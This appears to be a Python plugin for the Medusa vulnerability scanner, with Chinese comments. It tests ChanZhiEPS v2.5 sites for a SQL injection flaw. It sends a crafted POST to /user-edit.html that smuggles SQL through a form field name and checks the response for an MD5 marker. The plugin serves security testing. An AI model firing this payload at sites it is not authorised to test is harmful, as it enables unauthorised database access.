#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
from ClassCongregation import VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date']  = "2020-03-05"  # 插件编辑时间
        self.info['disclosure']='2014-09-28'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "ChanZhiEPSSQLInjectionVulnerability"  # 插件名称
        self.info['name'] ='ChanZhiEPSSQL注入漏洞' #漏洞名称
        self.info['affects'] = "ChanZhiEPS"  # 漏洞组件
        self.info['desc_content'] = "问题出在用户修改资料的地方,/system/module/user/control.php"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "v2.5"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        payload = "/user-edit.html"
        data = "realname=aaaaaa&email=a%40qqqq.com&password1=&password2=&company=&address=&zipcode=&mobile=&phone=&qq`%3D1,`admin=md5%28c%29>alk="
        payload_url =url+ payload

        resp = requests.post(payload_url, data=data, headers=Headers,proxies=proxies, timeout=6, verify=False)
        con = resp.text
        if con.find("4a8a08f09d37b73795649038408b5f33") != -1:
            Medusa = "{}存在ChanZhiEPSSQL注入漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类